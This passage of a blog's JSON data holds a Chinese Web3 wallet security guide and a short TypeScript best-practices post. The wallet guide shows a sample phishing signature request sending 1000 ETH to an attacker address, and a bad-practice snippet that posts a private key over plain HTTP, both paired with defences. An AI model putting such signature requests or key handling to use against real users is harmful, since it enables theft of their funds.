web-3-\u5b89\u5168"},{"inline":true,"label":"\u52a0\u5bc6\u8d27\u5e01","permalink":"/tags/\u52a0\u5bc6\u8d27\u5e01"},{"inline":true,"label":"\u5b89\u5168\u6700\u4f73\u5b9e\u8df5","permalink":"/tags/\u5b89\u5168\u6700\u4f73\u5b9e\u8df5"}],"readingTime":7.47,"hasTruncateMarker":true,"authors":[{"name":"AutoSec Team","title":"Web3 Security Researchers","url":"https://autosec.dev","imageURL":"/img/autosec.logo.png","key":"autosec","page":null}],"frontMatter":{"slug":"web3-wallet-security","title":"Web3\u94b1\u5305\u5b89\u5168\u5b8c\u5168\u6307\u5357\uff1a\u4ece\u539f\u7406\u5230\u5b9e\u8df5","authors":["autosec"],"tags":["\u94b1\u5305\u5b89\u5168","\u79c1\u94a5\u7ba1\u7406","Web3\u5b89\u5168","\u52a0\u5bc6\u8d27\u5e01","\u5b89\u5168\u6700\u4f73\u5b9e\u8df5"]},"unlisted":false,"prevItem":{"title":"Solidity Security Patterns: Writing Secure Smart Contracts","permalink":"/solidity-security-patterns"},"nextItem":{"title":"TypeScript \u6700\u4f73\u5b9e\u8df5\u6307\u5357","permalink":"/typescript-best-practices"}},"content":"Web3\u94b1\u5305\u662f\u7528\u6237\u8fdb\u5165\u533a\u5757\u94fe\u4e16\u754c\u7684\u95e8\u6237\uff0c\u4f46\u4e5f\u662f\u6700\u5bb9\u6613\u53d7\u5230\u653b\u51fb\u7684\u73af\u8282\u3002\u672c\u6587\u5c06\u6df1\u5165\u63a2\u8ba8\u94b1\u5305\u5b89\u5168\u7684\u5404\u4e2a\u65b9\u9762\uff0c\u4ece\u6280\u672f\u539f\u7406\u5230\u5b9e\u8df5\u5efa\u8bae\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \u94b1\u5305\u57fa\u7840\u77e5\u8bc6\\n\\n### \u94b1\u5305\u7c7b\u578b\\n\\n#### 1. \u70ed\u94b1\u5305 vs \u51b7\u94b1\u5305\\n\\n```javascript\\n// \u70ed\u94b1\u5305\u793a\u4f8b\uff1aMetaMask \u8fde\u63a5\\nasync function connectWallet() {\\n    if (typeof window.ethereum !== \'undefined\') {\\n        try {\\n            const accounts = await window.ethereum.request({\\n                method: \'eth_requestAccounts\'\\n            });\\n            \\n            console.log(\'Connected account:\', accounts[0]);\\n            return accounts[0];\\n        } catch (error) {\\n            console.error(\'User rejected connection:\', error);\\n        }\\n    } else {\\n        console.error(\'MetaMask not installed\');\\n    }\\n}\\n\\n// \u51b7\u94b1\u5305\uff1a\u786c\u4ef6\u94b1\u5305\u7b7e\u540d\\nasync function signWithHardwareWallet(transaction) {\\n    // \u4f7f\u7528 Ledger \u6216 Trezor \u7b49\u786c\u4ef6\u94b1\u5305\\n    const signature = await hardwareWallet.signTransaction(transaction);\\n    return signature;\\n}\\n```\\n\\n#### 2. \u6258\u7ba1\u94b1\u5305 vs \u975e\u6258\u7ba1\u94b1\u5305\\n\\n```solidity\\n// \u975e\u6258\u7ba1\u94b1\u5305\uff1a\u7528\u6237\u5b8c\u5168\u63a7\u5236\u79c1\u94a5\\ncontract NonCustodialWallet {\\n    address public owner;\\n    \\n    modifier onlyOwner() {\\n        require(msg.sender == owner, \\"Not owner\\");\\n        _;\\n    }\\n    \\n    function transfer(address to, uint256 amount) external onlyOwner {\\n        payable(to).transfer(amount);\\n    }\\n}\\n\\n// \u591a\u7b7e\u94b1\u5305\uff1a\u589e\u5f3a\u5b89\u5168\u6027\\ncontract MultiSigWallet {\\n    address[] public owners;\\n    uint256 public required;\\n    \\n    mapping(uint256 => mapping(address => bool)) public confirmations;\\n    \\n    function executeTransaction(uint256 txId) external {\\n        require(getConfirmationCount(txId) >= required, \\"Not enough confirmations\\");\\n        // \u6267\u884c\u4ea4\u6613\\n    }\\n}\\n```\\n\\n## \u5e38\u89c1\u653b\u51fb\u624b\u6cd5\\n\\n### 1. \u9493\u9c7c\u653b\u51fb\\n\\n#### \u7b7e\u540d\u9493\u9c7c\\n\\n```javascript\\n// \u6076\u610f\u7f51\u7ad9\u8bf1\u5bfc\u7528\u6237\u7b7e\u540d\\nconst maliciousMessage = {\\n    types: {\\n        Transfer: [\\n            { name: \'to\', type: \'address\' },\\n            { name: \'amount\', type: \'uint256\' }\\n        ]\\n    },\\n    primaryType: \'Transfer\',\\n    domain: {\\n        name: \'Fake DApp\',\\n        version: \'1\',\\n        chainId: 1\\n    },\\n    message: {\\n        to: \'0xAttackerAddress\',\\n        amount: \'1000000000000000000000\' // 1000 ETH!\\n    }\\n};\\n\\n// \u7528\u6237\u4e0d\u5c0f\u5fc3\u7b7e\u540d\u540e\uff0c\u8d44\u4ea7\u88ab\u8f6c\u8d70\\nawait ethereum.request({\\n    method: \'eth_signTypedData_v4\',\\n    params: [userAddress, JSON.stringify(maliciousMessage)]\\n});\\n```\\n\\n**\u9632\u5fa1\u63aa\u65bd\uff1a**\\n\\n```javascript\\n// \u5b89\u5168\u7684\u7b7e\u540d\u9a8c\u8bc1\\nfunction verifySignatureRequest(message) {\\n    // 1. \u68c0\u67e5\u57df\u540d\\n    if (message.domain.name !== EXPECTED_DAPP_NAME) {\\n        throw new Error(\'Suspicious domain name\');\\n    }\\n    \\n    // 2. \u68c0\u67e5\u63a5\u6536\u5730\u5740\\n    if (!isKnownAddress(message.message.to)) {\\n        console.warn(\'Warning: Unknown recipient address\');\\n        return false;\\n    }\\n    \\n    // 3. \u68c0\u67e5\u91d1\u989d\\n    if (message.message.amount > MAX_SAFE_AMOUNT) {\\n        console.warn(\'Warning: Large amount requested\');\\n        return false;\\n    }\\n    \\n    return true;\\n}\\n```\\n\\n### 2. \u6388\u6743\u6ee5\u7528\\n\\n```solidity\\n// \u5371\u9669\uff1a\u65e0\u9650\u6388\u6743\\ntoken.approve(spender, type(uint256).max);\\n\\n// \u5b89\u5168\uff1a\u9650\u989d\u6388\u6743\\ntoken.approve(spender, specificAmount);\\n\\n// \u66f4\u5b89\u5168\uff1a\u4f7f\u7528 permit (EIP-2612)\\nfunction permitAndTransfer(\\n    address token,\\n    address owner,\\n    address spender,\\n    uint256 value,\\n    uint256 deadline,\\n    uint8 v,\\n    bytes32 r,\\n    bytes32 s\\n) external {\\n    IERC20Permit(token).permit(owner, spender, value, deadline, v, r, s);\\n    IERC20(token).transferFrom(owner, address(this), value);\\n}\\n```\\n\\n**\u68c0\u67e5\u548c\u64a4\u9500\u6388\u6743\uff1a**\\n\\n```javascript\\n// \u68c0\u67e5\u5f53\u524d\u6388\u6743\\nasync function checkAllowance(tokenAddress, ownerAddress, spenderAddress) {\\n    const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);\\n    const allowance = await token.allowance(ownerAddress, spenderAddress);\\n    \\n    console.log(\'Current allowance:\', ethers.utils.formatEther(allowance));\\n    return allowance;\\n}\\n\\n// \u64a4\u9500\u6388\u6743\\nasync function revokeApproval(tokenAddress, spenderAddress) {\\n    const token = new ethers.Contract(tokenAddress, ERC20_ABI, signer);\\n    const tx = await token.approve(spenderAddress, 0);\\n    await tx.wait();\\n    \\n    console.log(\'Approval revoked\');\\n}\\n```\\n\\n### 3. \u79c1\u94a5\u6cc4\u9732\\n\\n#### \u5e38\u89c1\u6cc4\u9732\u9014\u5f84\\n\\n1. **\u660e\u6587\u5b58\u50a8**\\n\\n```javascript\\n// \u5371\u9669\uff01\u6c38\u8fdc\u4e0d\u8981\u8fd9\u6837\u505a\\nconst privateKey = \\"0x1234567890abcdef...\\";\\nlocalStorage.setItem(\'privateKey\', privateKey);\\n\\n// \u6b63\u786e\u505a\u6cd5\uff1a\u4f7f\u7528\u52a0\u5bc6\u5b58\u50a8\\nimport CryptoJS from \'crypto-js\';\\n\\nfunction encryptPrivateKey(privateKey, password) {\\n    return CryptoJS.AES.encrypt(privateKey, password).toString();\\n}\\n\\nfunction decryptPrivateKey(encryptedKey, password) {\\n    const bytes = CryptoJS.AES.decrypt(encryptedKey, password);\\n    return bytes.toString(CryptoJS.enc.Utf8);\\n}\\n```\\n\\n2. **\u7f51\u7edc\u4f20\u8f93\u6cc4\u9732**\\n\\n```javascript\\n// \u5371\u9669\uff1a\u901a\u8fc7HTTP\u53d1\u9001\u79c1\u94a5\\nfetch(\'http://api.example.com/login\', {\\n    method: \'POST\',\\n    body: JSON.stringify({ privateKey: key })\\n});\\n\\n// \u6b63\u786e\uff1a\u6c38\u8fdc\u4e0d\u8981\u53d1\u9001\u79c1\u94a5\uff0c\u4f7f\u7528\u7b7e\u540d\u9a8c\u8bc1\\nasync function authenticateWithSignature() {\\n    const message = `Login to DApp at ${Date.now()}`;\\n    const signature = await signer.signMessage(message);\\n    \\n    fetch(\'https://api.example.com/login\', {\\n        method: \'POST\',\\n        body: JSON.stringify({\\n            address: await signer.getAddress(),\\n            message: message,\\n            signature: signature\\n        })\\n    });\\n}\\n```\\n\\n## \u5b89\u5168\u6700\u4f73\u5b9e\u8df5\\n\\n### 1. \u52a9\u8bb0\u8bcd\u7ba1\u7406\\n\\n```javascript\\n// \u751f\u6210\u52a9\u8bb0\u8bcd\\nimport { ethers } from \'ethers\';\\n\\nfunction generateMnemonic() {\\n    const wallet = ethers.Wallet.createRandom();\\n    return {\\n        mnemonic: wallet.mnemonic.phrase,\\n        address: wallet.address,\\n        privateKey: wallet.privateKey\\n    };\\n}\\n\\n// \u4ece\u52a9\u8bb0\u8bcd\u6062\u590d\u94b1\u5305\\nfunction recoverFromMnemonic(mnemonic, index = 0) {\\n    const hdNode = ethers.utils.HDNode.fromMnemonic(mnemonic);\\n    const path = `m/44\'/60\'/0\'/0/${index}`;\\n    const wallet = hdNode.derivePath(path);\\n    \\n    return {\\n        address: wallet.address,\\n        privateKey: wallet.privateKey\\n    };\\n}\\n\\n// \u52a9\u8bb0\u8bcd\u5b89\u5168\u5b58\u50a8\u5efa\u8bae\\nconst mnemonicSecurityTips = [\\n    \\"1. \u6c38\u8fdc\u4e0d\u8981\u6570\u5b57\u5316\u5b58\u50a8\uff08\u4e0d\u8981\u622a\u56fe\u3001\u4e0d\u8981\u4e91\u5b58\u50a8\uff09\\",\\n    \\"2. \u4f7f\u7528\u7269\u7406\u4ecb\u8d28\uff08\u91d1\u5c5e\u677f\u3001\u7eb8\u5f20\uff09\\",\\n    \\"3. \u5206\u6563\u5b58\u50a8\uff08\u4e0d\u540c\u5730\u70b9\uff09\\",\\n    \\"4. \u8003\u8651\u4f7f\u7528 Shamir\'s Secret Sharing \u5206\u7247\\",\\n    \\"5. \u5b9a\u671f\u68c0\u67e5\u5907\u4efd\u5b8c\u6574\u6027\\"\\n];\\n```\\n\\n### 2. \u4ea4\u6613\u7b7e\u540d\u9a8c\u8bc1\\n\\n```javascript\\n// \u5b8c\u6574\u7684\u4ea4\u6613\u9a8c\u8bc1\u6d41\u7a0b\\nasync function safeTransactionFlow(transaction) {\\n    // 1. \u9a8c\u8bc1\u63a5\u6536\u5730\u5740\\n    if (!ethers.utils.isAddress(transaction.to)) {\\n        throw new Error(\'Invalid recipient address\');\\n    }\\n    \\n    // 2. \u68c0\u67e5\u5730\u5740\u662f\u5426\u5728\u9ed1\u540d\u5355\\n    if (await isBlacklistedAddress(transaction.to)) {\\n        throw new Error(\'Recipient is blacklisted\');\\n    }\\n    \\n    // 3. \u4f30\u7b97 gas\\n    const gasEstimate = await provider.estimateGas(transaction);\\n    transaction.gasLimit = gasEstimate.mul(120).div(100); // 20% buffer\\n    \\n    // 4. \u83b7\u53d6\u5f53\u524d gas \u4ef7\u683c\\n    const gasPrice = await provider.getGasPrice();\\n    transaction.gasPrice = gasPrice;\\n    \\n    // 5. \u8ba1\u7b97\u603b\u6210\u672c\\n    const totalCost = transaction.value.add(\\n        transaction.gasLimit.mul(transaction.gasPrice)\\n    );\\n    \\n    // 6. \u68c0\u67e5\u4f59\u989d\\n    const balance = await provider.getBalance(await signer.getAddress());\\n    if (balance.lt(totalCost)) {\\n        throw new Error(\'Insufficient balance\');\\n    }\\n    \\n    // 7. \u663e\u793a\u4ea4\u6613\u8be6\u60c5\u4f9b\u7528\u6237\u786e\u8ba4\\n    console.log(\'Transaction Details:\');\\n    console.log(\'To:\', transaction.to);\\n    console.log(\'Value:\', ethers.utils.formatEther(transaction.value), \'ETH\');\\n    console.log(\'Gas Cost:\', ethers.utils.formatEther(\\n        transaction.gasLimit.mul(transaction.gasPrice)\\n    ), \'ETH\');\\n    \\n    // 8. \u7528\u6237\u786e\u8ba4\u540e\u7b7e\u540d\\n    const signedTx = await signer.signTransaction(transaction);\\n    \\n    // 9. \u53d1\u9001\u4ea4\u6613\\n    const txResponse = await provider.sendTransaction(signedTx);\\n    \\n    // 10. \u7b49\u5f85\u786e\u8ba4\\n    const receipt = await txResponse.wait();\\n    \\n    return receipt;\\n}\\n```\\n\\n### 3. \u667a\u80fd\u5408\u7ea6\u4ea4\u4e92\u5b89\u5168\\n\\n```javascript\\n// \u5b89\u5168\u7684\u5408\u7ea6\u8c03\u7528\\nasync function safeContractInteraction(contractAddress, abi, method, params) {\\n    // 1. \u9a8c\u8bc1\u5408\u7ea6\u5730\u5740\\n    const code = await provider.getCode(contractAddress);\\n    if (code === \'0x\') {\\n        throw new Error(\'No contract at this address\');\\n    }\\n    \\n    // 2. \u68c0\u67e5\u5408\u7ea6\u662f\u5426\u5df2\u9a8c\u8bc1\\n    const isVerified = await checkContractVerification(contractAddress);\\n    if (!isVerified) {\\n        console.warn(\'Warning: Contract source code not verified\');\\n    }\\n    \\n    // 3. \u521b\u5efa\u5408\u7ea6\u5b9e\u4f8b\\n    const contract = new ethers.Contract(contractAddress, abi, signer);\\n    \\n    // 4. \u6a21\u62df\u8c03\u7528\uff08\u68c0\u67e5\u662f\u5426\u4f1a\u5931\u8d25\uff09\\n    try {\\n        await contract.callStatic[method](...params);\\n    } catch (error) {\\n        throw new Error(`Transaction would fail: ${error.message}`);\\n    }\\n    \\n    // 5. \u4f30\u7b97 gas\\n    const gasEstimate = await contract.estimateGas[method](...params);\\n    \\n    // 6. \u6267\u884c\u4ea4\u6613\\n    const tx = await contract[method](...params, {\\n        gasLimit: gasEstimate.mul(120).div(100)\\n    });\\n    \\n    // 7. \u7b49\u5f85\u786e\u8ba4\\n    const receipt = await tx.wait();\\n    \\n    return receipt;\\n}\\n\\n// \u68c0\u67e5\u5408\u7ea6\u9a8c\u8bc1\u72b6\u6001\\nasync function checkContractVerification(address) {\\n    // \u4f7f\u7528 Etherscan API\\n    const response = await fetch(\\n        `https://api.etherscan.io/api?module=contract&action=getabi&address=${address}`\\n    );\\n    const data = await response.json();\\n    return data.status === \'1\';\\n}\\n```\\n\\n### 4. \u591a\u91cd\u7b7e\u540d\u94b1\u5305\\n\\n```solidity\\n// \u9ad8\u7ea7\u591a\u7b7e\u94b1\u5305\u5b9e\u73b0\\ncontract AdvancedMultiSig {\\n    struct Transaction {\\n        address to;\\n        uint256 value;\\n        bytes data;\\n        bool executed;\\n        uint256 confirmations;\\n        uint256 createdAt;\\n    }\\n    \\n    address[] public owners;\\n    mapping(address => bool) public isOwner;\\n    uint256 public required;\\n    uint256 public transactionTimeout = 7 days;\\n    \\n    Transaction[] public transactions;\\n    mapping(uint256 => mapping(address => bool)) public confirmations;\\n    \\n    event TransactionSubmitted(uint256 indexed txId, address indexed submitter);\\n    event TransactionConfirmed(uint256 indexed txId, address indexed confirmer);\\n    event TransactionExecuted(uint256 indexed txId);\\n    event TransactionCancelled(uint256 indexed txId);\\n    \\n    modifier onlyOwner() {\\n        require(isOwner[msg.sender], \\"Not owner\\");\\n        _;\\n    }\\n    \\n    modifier txExists(uint256 txId) {\\n        require(txId < transactions.length, \\"Transaction does not exist\\");\\n        _;\\n    }\\n    \\n    modifier notExecuted(uint256 txId) {\\n        require(!transactions[txId].executed, \\"Transaction already executed\\");\\n        _;\\n    }\\n    \\n    modifier notExpired(uint256 txId) {\\n        require(\\n            block.timestamp <= transactions[txId].createdAt + transactionTimeout,\\n            \\"Transaction expired\\"\\n        );\\n        _;\\n    }\\n    \\n    function submitTransaction(\\n        address to,\\n        uint256 value,\\n        bytes memory data\\n    ) external onlyOwner returns (uint256) {\\n        uint256 txId = transactions.length;\\n        \\n        transactions.push(Transaction({\\n            to: to,\\n            value: value,\\n            data: data,\\n            executed: false,\\n            confirmations: 0,\\n            createdAt: block.timestamp\\n        }));\\n        \\n        emit TransactionSubmitted(txId, msg.sender);\\n        \\n        // \u81ea\u52a8\u786e\u8ba4\\n        confirmTransaction(txId);\\n        \\n        return txId;\\n    }\\n    \\n    function confirmTransaction(uint256 txId)\\n        public\\n        onlyOwner\\n        txExists(txId)\\n        notExecuted(txId)\\n        notExpired(txId)\\n    {\\n        require(!confirmations[txId][msg.sender], \\"Already confirmed\\");\\n        \\n        confirmations[txId][msg.sender] = true;\\n        transactions[txId].confirmations++;\\n        \\n        emit TransactionConfirmed(txId, msg.sender);\\n        \\n        if (transactions[txId].confirmations >= required) {\\n            executeTransaction(txId);\\n        }\\n    }\\n    \\n    function executeTransaction(uint256 txId) internal {\\n        Transaction storage transaction = transactions[txId];\\n        transaction.executed = true;\\n        \\n        (bool success, ) = transaction.to.call{value: transaction.value}(\\n            transaction.data\\n        );\\n        require(success, \\"Transaction execution failed\\");\\n        \\n        emit TransactionExecuted(txId);\\n    }\\n    \\n    function revokeConfirmation(uint256 txId)\\n        external\\n        onlyOwner\\n        txExists(txId)\\n        notExecuted(txId)\\n    {\\n        require(confirmations[txId][msg.sender], \\"Not confirmed\\");\\n        \\n        confirmations[txId][msg.sender] = false;\\n        transactions[txId].confirmations--;\\n    }\\n    \\n    function cancelTransaction(uint256 txId)\\n        external\\n        onlyOwner\\n        txExists(txId)\\n        notExecuted(txId)\\n    {\\n        require(\\n            block.timestamp > transactions[txId].createdAt + transactionTimeout,\\n            \\"Not expired yet\\"\\n        );\\n        \\n        transactions[txId].executed = true; // \u6807\u8bb0\u4e3a\u5df2\u6267\u884c\u4ee5\u9632\u6b62\u6267\u884c\\n        emit TransactionCancelled(txId);\\n    }\\n}\\n```\\n\\n## \u5e94\u6025\u54cd\u5e94\\n\\n### \u8d44\u4ea7\u88ab\u76d7\u540e\u7684\u5904\u7406\\n\\n```javascript\\n// \u7d27\u6025\u8f6c\u79fb\u5269\u4f59\u8d44\u4ea7\\nasync function emergencyTransfer(compromisedWallet, safeWallet) {\\n    const balance = await provider.getBalance(compromisedWallet.address);\\n    \\n    // \u8ba1\u7b97 gas \u6210\u672c\\n    const gasPrice = await provider.getGasPrice();\\n    const gasLimit = 21000;\\n    const gasCost = gasPrice.mul(gasLimit);\\n    \\n    // \u8f6c\u79fb\u6240\u6709\u5269\u4f59\u8d44\u4ea7\\n    const amountToSend = balance.sub(gasCost);\\n    \\n    if (amountToSend.gt(0)) {\\n        const tx = await compromisedWallet.sendTransaction({\\n            to: safeWallet,\\n            value: amountToSend,\\n            gasPrice: gasPrice.mul(150).div(100), // \u63d0\u9ad8 gas \u4ef7\u683c\u4ee5\u52a0\u5feb\u786e\u8ba4\\n            gasLimit: gasLimit\\n        });\\n        \\n        await tx.wait();\\n        console.log(\'Emergency transfer completed\');\\n    }\\n}\\n\\n// \u64a4\u9500\u6240\u6709\u4ee3\u5e01\u6388\u6743\\nasync function revokeAllApprovals(wallet, tokenAddresses) {\\n    for (const tokenAddress of tokenAddresses) {\\n        const token = new ethers.Contract(tokenAddress, ERC20_ABI, wallet);\\n        \\n        // \u83b7\u53d6\u6240\u6709\u6388\u6743\u7684\u5730\u5740\uff08\u9700\u8981\u4e8b\u5148\u8bb0\u5f55\uff09\\n        const spenders = await getApprovedSpenders(tokenAddress, wallet.address);\\n        \\n        for (const spender of spenders) {\\n            try {\\n                const tx = await token.approve(spender, 0, {\\n                    gasPrice: (await provider.getGasPrice()).mul(150).div(100)\\n                });\\n                await tx.wait();\\n                console.log(`Revoked approval for ${spender}`);\\n            } catch (error) {\\n                console.error(`Failed to revoke ${spender}:`, error);\\n            }\\n        }\\n    }\\n}\\n```\\n\\n## \u5b89\u5168\u5de5\u5177\u63a8\u8350\\n\\n### 1. \u94b1\u5305\u5b89\u5168\u68c0\u67e5\u5de5\u5177\\n\\n- **Revoke.cash**: \u68c0\u67e5\u548c\u64a4\u9500\u4ee3\u5e01\u6388\u6743\\n- **Etherscan Token Approvals**: \u67e5\u770b\u6240\u6709\u6388\u6743\\n- **Wallet Guard**: \u6d4f\u89c8\u5668\u6269\u5c55\uff0c\u8b66\u544a\u6076\u610f\u4ea4\u6613\\n\\n### 2. \u4ea4\u6613\u6a21\u62df\u5de5\u5177\\n\\n- **Tenderly**: \u4ea4\u6613\u6a21\u62df\u548c\u8c03\u8bd5\\n- **Phalcon**: \u4ea4\u6613\u5206\u6790\\n- **Blocksec**: \u5b9e\u65f6\u4ea4\u6613\u76d1\u63a7\\n\\n## \u603b\u7ed3\\n\\nWeb3 \u94b1\u5305\u5b89\u5168\u7684\u5173\u952e\u8981\u70b9\uff1a\\n\\n1. \ud83d\udd10 **\u79c1\u94a5\u7ba1\u7406**\uff1a\u6c38\u8fdc\u4e0d\u8981\u5728\u7ebf\u5b58\u50a8\u6216\u4f20\u8f93\\n2. \u2705 **\u4ea4\u6613\u9a8c\u8bc1**\uff1a\u4ed4\u7ec6\u68c0\u67e5\u6bcf\u7b14\u4ea4\u6613\\n3. \ud83d\udee1\ufe0f **\u6388\u6743\u63a7\u5236**\uff1a\u5b9a\u671f\u68c0\u67e5\u548c\u64a4\u9500\u4e0d\u5fc5\u8981\u7684\u6388\u6743\\n4. \ud83d\udd0d **\u8b66\u60d5\u9493\u9c7c**\uff1a\u9a8c\u8bc1\u7f51\u7ad9\u771f\u5b9e\u6027\\n5. \ud83d\udcbe **\u5907\u4efd\u52a9\u8bb0\u8bcd**\uff1a\u4f7f\u7528\u7269\u7406\u4ecb\u8d28\uff0c\u5206\u6563\u5b58\u50a8\\n6. \ud83d\udea8 **\u5e94\u6025\u51c6\u5907**\uff1a\u5236\u5b9a\u8d44\u4ea7\u88ab\u76d7\u5e94\u6025\u9884\u6848\\n\\n\u8bb0\u4f4f\uff1a**\u5728 Web3 \u4e16\u754c\uff0c\u4f60\u5c31\u662f\u81ea\u5df1\u7684\u94f6\u884c\u3002\u5b89\u5168\u8d23\u4efb\u5b8c\u5168\u5728\u4f60\u624b\u4e2d\u3002**\\n\\n---\\n\\n**AutoSec \u63d0\u9192**\uff1a\u5b9a\u671f\u8fdb\u884c\u5b89\u5168\u5ba1\u67e5\uff0c\u4fdd\u6301\u8b66\u60d5\uff0c\u4fdd\u62a4\u4f60\u7684\u6570\u5b57\u8d44\u4ea7\u3002"},{"id":"typescript-best-practices","metadata":{"permalink":"/typescript-best-practices","editUrl":"https://github.com/pfyangf/pfyangf.github.io/tree/main/blog/2025/01-20-typescript-best-practices.md","source":"@site/blog/2025/01-20-typescript-best-practices.md","title":"TypeScript \u6700\u4f73\u5b9e\u8df5\u6307\u5357","description":"TypeScript \u5df2\u7ecf\u6210\u4e3a\u73b0\u4ee3\u524d\u7aef\u5f00\u53d1\u7684\u6807\u51c6\u914d\u7f6e\u3002\u672c\u6587\u5c06\u5206\u4eab\u4e00\u4e9b TypeScript \u5f00\u53d1\u4e2d\u7684\u6700\u4f73\u5b9e\u8df5\u3002","date":"2025-01-20T10:00:00.000Z","tags":[{"inline":false,"label":"TypeScript","permalink":"/tags/typescript","description":"TypeScript \u7f16\u7a0b\u8bed\u8a00"},{"inline":false,"label":"JavaScript","permalink":"/tags/javascript","description":"JavaScript \u7f16\u7a0b\u8bed\u8a00"},{"inline":false,"label":"\u6700\u4f73\u5b9e\u8df5","permalink":"/tags/best-practices","description":"\u7f16\u7a0b\u6700\u4f73\u5b9e\u8df5"}],"readingTime":1.6,"hasTruncateMarker":true,"authors":[{"name":"AutoSec Team","title":"Web3 Security Researchers","url":"https://autosec.dev","imageURL":"/img/autosec.logo.png","key":"autosec","page":null}],"frontMatter":{"slug":"typescript-best-practices","title":"TypeScript \u6700\u4f73\u5b9e\u8df5\u6307\u5357","authors":["autosec"],"tags":["typescript","javascript","best-practices"],"date":"2025-01-20T10:00"},"unlisted":false,"prevItem":{"title":"Web3\u94b1\u5305\u5b89\u5168\u5b8c\u5168\u6307\u5357\uff1a\u4ece\u539f\u7406\u5230\u5b9e\u8df5","permalink":"/web3-wallet-security"},"nextItem":{"title":"\u6b22\u8fce\u6765\u5230\u6211\u7684\u6280\u672f\u535a\u5ba2","permalink":"/welcome-to-my-blog"}},"content":"TypeScript \u5df2\u7ecf\u6210\u4e3a\u73b0\u4ee3\u524d\u7aef\u5f00\u53d1\u7684\u6807\u51c6\u914d\u7f6e\u3002\u672c\u6587\u5c06\u5206\u4eab\u4e00\u4e9b TypeScript \u5f00\u53d1\u4e2d\u7684\u6700\u4f73\u5b9e\u8df5\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## 1. \u4f7f\u7528\u4e25\u683c\u6a21\u5f0f\\n\\n\u5728 `tsconfig.json` \u4e2d\u542f\u7528\u4e25\u683c\u6a21\u5f0f\uff1a\\n\\n```json\\n{\\n  \\"compilerOptions\\": {\\n    \\"strict\\": true,\\n    \\"noImplicitAny\\": true,\\n    \\"strictNullChecks\\": true,\\n    \\"strictFunctionTypes\\": true\\n  }\\n}\\n```\\n\\n## 2. \u4f18\u5148\u4f7f\u7528\u63a5\u53e3\u800c\u975e\u7c7b\u578b\u522b\u540d\\n\\n\u5bf9\u4e8e\u5bf9\u8c61\u7c7b\u578b\u5b9a\u4e49\uff0c\u4f18\u5148\u4f7f\u7528 `interface`\uff1a\\n\\n```typescript\\n// \u2705 \u63a8\u8350\\ninterface User {\\n  id: number;\\n  name: string;\\n  email: string;\\n}\\n\\n// \u26a0\ufe0f \u7c7b\u578b\u522b\u540d\u4e5f\u53ef\u4ee5\uff0c\u4f46\u63a5\u53e3\u66f4\u9002\u5408\u5bf9\u8c61\\ntype User = {\\n  id: number;\\n  name: string;\\n  email: string;\\n};\\n```\\n\\n## 3. \u4f7f\u7528\u8054\u5408\u7c7b\u578b\u548c\u7c7b\u578b\u5b88\u536b\\n\\n```typescript\\ntype Status = \'pending\' | \'success\' | \'error\';\\n\\ninterface ApiResponse<T> {\\n  status: Status;\\n  data?: T;\\n  error?: string;\\n}\\n\\nfunction handleResponse<T>(response: ApiResponse<T>): void {\\n  if (response.status === \'success\' && response.data) {\\n    console.log(\'\u6210\u529f:\', response.data);\\n  } else if (response.status === \'error\') {\\n    console.error(\'\u9519\u8bef:\', response.error);\\n  }\\n}\\n```\\n\\n## 4. \u5584\u7528\u6cdb\u578b\\n\\n\u6cdb\u578b\u8ba9\u4ee3\u7801\u66f4\u52a0\u7075\u6d3b\u548c\u53ef\u590d\u7528\uff1a\\n\\n```typescript\\n// \u901a\u7528\u7684\u5f02\u6b65\u8bf7\u6c42\u51fd\u6570\\nasync function fetchData<T>(url: string): Promise<T> {\\n  const response = await fetch(url);\\n  return response.json() as Promise<T>;\\n}\\n\\n// \u4f7f\u7528\\ninterface Post {\\n  id: number;\\n  title: string;\\n  content: string;\\n}\\n\\nconst posts = await fetchData<Post[]>(\'/api/posts\');\\n```\\n\\n## 5. \u4f7f\u7528 readonly \u4fdd\u62a4\u6570\u636e\\n\\n```typescript\\ninterface Config {\\n  readonly apiUrl: string;\\n  readonly timeout: number;\\n}\\n\\nconst config: Config = {\\n  apiUrl: \'https://api.example.com\',\\n  timeout: 5000,\\n};\\n\\n// config.apiUrl = \'xxx\'; // \u274c \u7f16\u8bd1\u9519\u8bef\\n```\\n\\n## 6. \u679a\u4e3e\u7684\u6b63\u786e\u4f7f\u7528\\n\\n```typescript\\n// \u5b57\u7b26\u4e32\u679a\u4e3e\u66f4\u5b89\u5168\\nenum LogLevel {\\n  DEBUG = \'DEBUG\',\\n  INFO = \'INFO\',\\n  WARN = \'WARN\',\\n  ERROR = \'ERROR\',\\n}\\n\\nfunction log(level: LogLevel, message: string): void {\\n  console.log(`[${level}] ${message}`);\\n}\\n\\nlog(LogLevel.INFO, \'\u5e94\u7528\u542f\u52a8\');\\n```\\n\\n## 7. \u4f7f\u7528 unknown \u4ee3\u66ff any\\n\\n```typescript\\n// \u274c \u907f\u514d\u4f7f\u7528 any\\nfunction processData(data: any) {\\n  return data.value; // \u6ca1\u6709\u7c7b\u578b\u68c0\u67e5\\n}\\n\\n// \u2705 \u4f7f\u7528 unknown\\nfunction processData(data: unknown) {\\n  if (typeof data === \'object\' && data !== null && \'value\' in data) {\\n    return (data as { value: string }).value;\\n  }\\n  throw new Error(\'Invalid data\');\\n}\\n```\\n\\n## \u603b\u7ed3\\n\\n\u9075\u5faa\u8fd9\u4e9b\u6700\u4f73\u5b9e\u8df5\u53ef\u4ee5\u8ba9\u4f60\u7684 TypeScript \u4ee3\u7801\u66f4\u52a0\u5065\u58ee\u3001\u53ef\u7ef4\u62a4\u3002\u8bb0\u4f4f\uff1a\\n\\n- \u542f\u7528\u4e25\u683c\u6a21\u5f0f\\n- \u5408\u7406\u4f7f\u7528\u7c7b\u578b\u7cfb\u7edf\\n- \u907f\u514d\u4f7f\u7528 `any`\\n- \u5584\u7528\u6cdb\u578b\u548c\u7c7b\u578b\u5b88\u536b\\n- \u4fdd\u6301\u4ee3\u7801\u7684\u7c7b\u578b\u5b89\u5168\\n\\nHappy coding! 